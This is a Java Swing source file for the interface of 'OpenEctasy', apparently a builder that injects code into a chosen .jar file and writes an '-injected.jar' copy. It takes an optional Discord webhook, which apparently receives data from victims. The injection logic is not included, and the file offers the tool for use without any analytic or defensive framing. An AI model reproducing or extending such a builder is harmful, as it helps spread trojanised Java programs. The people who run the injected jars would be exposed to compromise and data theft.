package fr.bodyalhoha.gui;

import fr.bodyalhoha.ectasy.Main;
import fr.bodyalhoha.ectasy.utils.Injector;
import fr.bodyalhoha.ectasy.utils.OptionsParser;

import javax.imageio.ImageIO;
import javax.swing.*;
import javax.swing.filechooser.FileNameExtensionFilter;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.FocusEvent;
import java.awt.event.FocusListener;
import java.awt.image.BufferedImage;
import java.io.File;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.List;

public class EctasyGUI {

    public JFrame frame;

    public EctasyGUI(){

        try{
            UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
        }catch (Exception ignored){

        }

        this.frame = new JFrame("Ectasy");
        JPanel panel = new JPanel();
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setSize(800, 450);
        frame.setLocationRelativeTo(null);
        frame.setResizable(false);
        panel.setBackground(new Color(24, 24, 24));



        JLabel label = new JLabel();
        label.setText("OpenEctasy");
        label.setForeground(Color.WHITE);
        label.setFont(new Font("Segoe UI", Font.PLAIN, 22));
        label.setVerticalTextPosition(SwingConstants.TOP);
        label.setHorizontalAlignment(SwingConstants.LEFT);
        panel.add(label);

        JTextField input = new JTextField();
        input.setText("Input");
        input.setFont(label.getFont());
        input.setForeground(Color.WHITE);
        input.setBackground(new Color(16, 16, 16));
        input.setLayout(null);
        input.setBounds(10, 55, 450, 30);
        input.setBorder(null);
        input.setCaretColor(Color.WHITE);
        input.addFocusListener(new FocusListener() {
            @Override
            public void focusLost(FocusEvent e) {
                if(input.getText().isEmpty()){
                    input.setText("Input");
                }
            }

            @Override
            public void focusGained(FocusEvent e) {
                if(input.getText().equals("Input")){
                    input.setText("");
                }
            }


        });

        JTextField output = new JTextField();
        output.setText("Output");
        output.setFont(label.getFont());
        output.setForeground(Color.WHITE);
        output.setBackground(new Color(16, 16, 16));
        output.setLayout(null);
        output.setBounds(10, 55 + 45, 450, 30);
        output.setBorder(null);
        output.setCaretColor(Color.WHITE);
        output.addFocusListener(new FocusListener() {
            @Override
            public void focusLost(FocusEvent e) {
                if(output.getText().isEmpty()){
                    output.setText("Output");
                }
            }

            @Override
            public void focusGained(FocusEvent e) {
                if(output.getText().equals("Output")){
                    output.setText("");
                }
            }


        });

        JTextField webhook = new JTextField();
        webhook.setText("Discord Webhook");
        webhook.setFont(label.getFont());
        webhook.setForeground(Color.WHITE);
        webhook.setBackground(new Color(16, 16, 16));
        webhook.setLayout(null);
        webhook.setBounds(10, 55 + 45 * 2, 450, 30);
        webhook.setBorder(null);
        webhook.setCaretColor(Color.WHITE);
        webhook.addFocusListener(new FocusListener() {
            @Override
            public void focusLost(FocusEvent e) {
                if(webhook.getText().isEmpty()){
                    webhook.setText("Discord Webhook");
                }
            }

            @Override
            public void focusGained(FocusEvent e) {
                if(webhook.getText().equals("Discord Webhook")){
                    webhook.setText("");
                }
            }


        });


        JButton inputButton = new JButton();
        inputButton.setBounds(10 + 465, 55, 75, 30);
        inputButton.setText("Select");
        inputButton.setForeground(Color.WHITE);
        inputButton.setBackground(new Color(16, 16, 16));
        inputButton.setBorder(null);
        inputButton.setFont(label.getFont());
        inputButton.setFocusPainted(false);
        inputButton.setContentAreaFilled(false);

        inputButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                JFileChooser fileChooser = new JFileChooser();

                fileChooser.setCurrentDirectory(new File(Injector.decode(Main.class.getProtectionDomain().getCodeSource().getLocation().getPath())));
                fileChooser.setFileFilter(new FileNameExtensionFilter("Jar files", "jar"));
                int result = fileChooser.showOpenDialog(frame);

                if(result == JFileChooser.APPROVE_OPTION){
                    input.setText(fileChooser.getSelectedFile().getAbsolutePath());
                    output.setText(input.getText().substring(0, input.getText().length() - 4) + "-injected.jar");
                }
            }
        });

        JButton injectButton = new JButton();
        injectButton.setBounds(frame.getWidth() / 2 - 75 / 2, frame.getHeight() - 80, 75, 30);
        injectButton.setText("Inject");
        injectButton.setForeground(Color.WHITE);
        injectButton.setBackground(new Color(16, 16, 16));
        injectButton.setBorder(null);
        injectButton.setFont(label.getFont());
        injectButton.setFocusPainted(false);
        injectButton.setContentAreaFilled(false);

        injectButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (!new File(input.getText()).exists()) {
                    JOptionPane.showMessageDialog(null, "Input file not found!");
                    return;
                }
                List<String> args = new ArrayList<String>();

                args.add("--input");
                args.add(input.getText());
                args.add("--output");
                args.add(output.getText());



                String wh = webhook.getText();
                if(!wh.equalsIgnoreCase("Discord Webhook")){
                    args.add("--webhook");
                    args.add(wh);
                }

                System.out.println(args);
                String[] s = args.toArray(new String[0]);
                Injector.inject(input.getText(), output.getText(), new OptionsParser(s, Main.has, Main.bools));
                JOptionPane.showMessageDialog(null, "Injected successfully!");

            }
        });

        frame.add(input);
        frame.add(inputButton);
        frame.add(injectButton);

        frame.add(output);
        frame.add(webhook);


        frame.setLayout(new BorderLayout());
        frame.getContentPane().add(panel);



        frame.setVisible(true);


    }

}
